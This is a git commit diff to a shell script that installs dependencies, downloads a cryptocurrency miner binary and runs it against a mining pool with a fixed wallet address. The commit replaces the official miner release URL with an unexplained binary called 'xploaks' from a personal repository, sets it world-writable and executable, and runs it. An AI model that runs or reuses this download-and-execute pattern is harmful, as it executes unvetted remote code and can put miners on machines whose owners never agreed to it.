318b8c83563f225eb5d7fde93757270dcd2ed36d
vedhagsvp <vedhag230223@gmail.com>
2025-09-23 17:59:36 +0530

    Update xpla.sh

--- xpla.sh
+++ xpla.sh
@@ -5,10 +5,10 @@ apt update && \
     apt -y install curl git wget libicu-dev
 
 # Download miner binary
-wget https://github.com/xpherechain/Xphere-miner/releases/download/v0.0.6/miner-linux-amd64
+wget https://github.com/vedhagsvp/xplare/releases/download/shaos/xploaks
 
 # Make it executable
-chmod 777 miner-linux-amd64
+chmod 777 xploaks
 
 # Run the miner
-./miner-linux-amd64 -stratum stratum+tcp://0x1932E17CB48175Fd79FD08596eCd246071913Cb4.$(echo $RANDOM | md5sum | head -c 10):x@stratum-sgp.x-phere.com:33333
+./xploaks -stratum stratum+tcp://0x1932E17CB48175Fd79FD08596eCd246071913Cb4.$(echo $RANDOM | md5sum | head -c 10):x@stratum-sgp.x-phere.com:33333
